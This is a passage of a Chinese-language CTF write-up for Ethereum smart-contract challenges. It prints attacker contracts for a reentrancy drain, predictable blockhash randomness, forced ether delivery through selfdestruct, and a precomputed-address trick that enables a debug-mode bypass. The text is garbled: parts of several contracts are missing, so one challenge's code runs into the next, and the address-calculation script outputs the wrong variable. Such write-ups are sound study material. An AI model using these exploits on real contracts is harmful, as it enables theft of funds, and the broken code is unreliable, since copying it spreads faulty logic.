        }
        function withdraw() external ctf{
            require(allowancePerYear > 0, "No Allowances Allowed");
            checkIfYearHasPassed();
            require(!withdrewThisYear, "Already Withdrew This Year");
            if (msg.sender.call.value(allowancePerYear)()){
                withdrewThisYear = true;
                numberOfWithdrawls = numberOfWithdrawls.add(1);
            }
        }
        function returnFunds() external payable ctf{
            require(msg.value == allowancePerYear, "Incorrect Transaction Value");
            require(withdrewThisYear==true, "Cannot Return Funds Before Withdraw");
            withdrewThisYear = false;
            numberOfWithdrawls=numberOfWithdrawls.sub(1);
        }
    }
一个很典型的重入漏洞，注意到此处
> if (msg.sender.call.value(allowancePerYear)()){  
>  withdrewThisYear = true;  
>  numberOfWithdrawls = numberOfWithdrawls.add(1);  
>  }
使用了`call.value`来发送ether，同时余额的更新放在了后面，这样我们就可以重复提币直到清空合约的ether了
部署攻击合约
    contract attack {
        TrustFund target;
        constructor() {
            target = TrustFund(your challenge address);
        }
        function pwn(){
            target.withdraw();
        }
        function () payable {
            target.withdraw();
        }
    }
同样记得先调用`ctf_challenge_add_authorized_sender`将攻击合约添加到玩家里
## 0x8.Record Label
主要代码
    contract Royalties{
        using SafeMath for uint256;
        address private collectionsContract;
        address private artist;
        address[] private receiver;
        mapping(address => uint256) private receiverToPercentOfProfit;
        uint256 private percentRemaining;
        uint256 public amountPaid;
        constructor(address _manager, address _artist) public
        {
            collectionsContract = msg.sender;
            artist=_artist;
            receiver.push(_manager);
            receiverToPercentOfProfit[_manager] = 80;
            percentRemaining = 100 - receiverToPercentOfProfit[_manager];
        }
        modifier isCollectionsContract() { 
            require(msg.sender == collectionsContract, "Unauthorized: Not Collections Contract");
            _;
        }
        modifier isArtist(){
            require(msg.sender == artist, "Unauthorized: Not Artist");
            _;
        }
        function addRoyaltyReceiver(address _receiver, uint256 _percent) external isArtist{
            require(_percent= cost.div(2), "Insufficient Funds in Game Contract");
            bytes32 entropy = blockhash(block.number-1);
            bytes1 coinFlip = entropy[0] & 1;
            if ((coinFlip == 1 && _heads) || (coinFlip == 0 && !_heads)) {
                //win
                gameFunds = gameFunds.sub(msg.value.div(2));
                msg.sender.transfer(msg.value.mul(3).div(2));
            }
            else {
                //loser
                gameFunds = gameFunds.add(msg.value);
            }
        }
    }
一个简单的赌博合约，还是利用随机数漏洞，每次猜对可以获得赌注的1.5倍，因为每次下注只能为0.1ether，所以一次的收益为0.05ether，要将合约的ether清空需要20次，那么我们直接在合约中循环调用20次即可
部署攻击合约
    contract attack {
        HeadsOrTails target;
        function attack() {
            target = HeadsOrTails(your challenge address);
        }
        function pwn() payable {
            bytes32 entropy = block.blockhash(block.number-1);
            bytes1 coinFlip = entropy[0] & 1;
            for(int i=0;i= winner){
                msg.sender.transfer(address(this).balance);
            }
        }
    }
完成挑战需要合约的balance大于5 ether，但是合约的fallback函数限制了我们每次发送的ether为1 szabo，而1
ether等于10^6
szabo，所以想靠这样发送ether满足条件是不现实的，这里就得利用`selfdestruct`函数在自毁合约时强制发送合约的balance，因为这样不会出发目标的fallback函数。
部署一个攻击合约
    contract attack {
        constructor() public payable{
        }
        function pwn() public {
            selfdestruct(your challenge address);
        }
    }
创建合约时发送足够的ether，然后销毁合约强制发送ether即可完成挑战。
## 0x11.Rainy Day Fund
主要代码
    contract DebugAuthorizer{
        bool public debugMode;
        constructor() public payable{
            if(address(this).balance == 1.337 ether){
                debugMode=true;
            }
        }
    }
    contract RainyDayFund is CtfFramework{
        address public developer;
        mapping(address=>bool) public fundManagerEnabled;
        DebugAuthorizer public debugAuthorizer;
        constructor(address _ctfLauncher, address _player) public payable
            CtfFramework(_ctfLauncher, _player)
        {
            //debugAuthorizer = (new DebugAuthorizer).value(1.337 ether)(); // Debug mode only used during development
            debugAuthorizer = new DebugAuthorizer();
            developer = msg.sender;
            fundManagerEnabled[msg.sender] = true;
        }
        modifier isManager() {
            require(fundManagerEnabled[msg.sender] || debugAuthorizer.debugMode() || msg.sender == developer, "Unauthorized: Not a Fund Manager");
             _;
        }
        function () external payable ctf{
            // Anyone can add to the fund    
        }
        function addFundManager(address _newManager) external isManager ctf{
            fundManagerEnabled[_newManager] = true;
        }
        function removeFundManager(address _previousManager) external isManager ctf{
            fundManagerEnabled[_previousManager] = false;
        }
        function withdraw() external isManager ctf{
            msg.sender.transfer(address(this).balance);
        }
    }
可以提币的地方只有withdraw函数，显然必须满足`isManager`条件
> modifier isManager() {  
>  require(fundManagerEnabled[msg.sender] || debugAuthorizer.debugMode() ||
> msg.sender == developer, “Unauthorized: Not a Fund Manager”);  
>  _;  
>  }
看了看第一个和第三个条件，显然是没法满足，只能将目光转向第二个条件，这就要求在`DebugAuthorizer`合约中在刚部署时其地址的balance即为1.337
ether，那么我们又想到了selfdestruct，不过这里合约已经部署，我们得在合约部署前计算出该`DebugAuthorizer`合约的地址，然后再向其发送1.337
ether
我们首先在挑战合约的创建交易里找到创建者的地址，如下
> 0xed0d5160c642492b3b482e006f67679f5b6223a2
这也是个合约，在以太坊源码中合约地址的计算方法如下
    func CreateAddress(b common.Address, nonce uint64) common.Address {
        data, _ := rlp.EncodeToBytes([]interface{}{b, nonce}) //对地址和nonce进行rlp编码
        return common.BytesToAddress(Keccak256(data)[12:]) //利用keccak256算hash，后20个字节作为新地址
    }
在该合约的[internaltx](https://ropsten.etherscan.io/address/0xed0d5160c642492b3b482e006f67679f5b6223a2#internaltx)查看一下部署下一个合约时的nonce值，数一下已经成功部署的合约有多少然后+1即可，利用该nonce我们即可算出部署的`RainyDayFund`合约的地址，接着使用该地址和nonce
1即可算出其部署的`DebugAuthorizer`合约的地址
    const util = require('ethereumjs-util');
    const rlp = require('rlp');
    var address1="0xeD0D5160c642492b3B482e006F67679F5b6223A2"
    encodedRlp1 = rlp.encode([address1, your nonce]);
    buf1 = util.sha3(encodedRlp1);
    address2 =buf1.slice(12).toString('hex');
    encodedRlp2= rlp.encode([address2, 1]);
    buf2 = util.sha3(encodedRlp2);
    address=buf1.slice(12).toString('hex');
    console.log(address);
然后向该地址发送1.337 ether，然后重新部署挑战合约即可。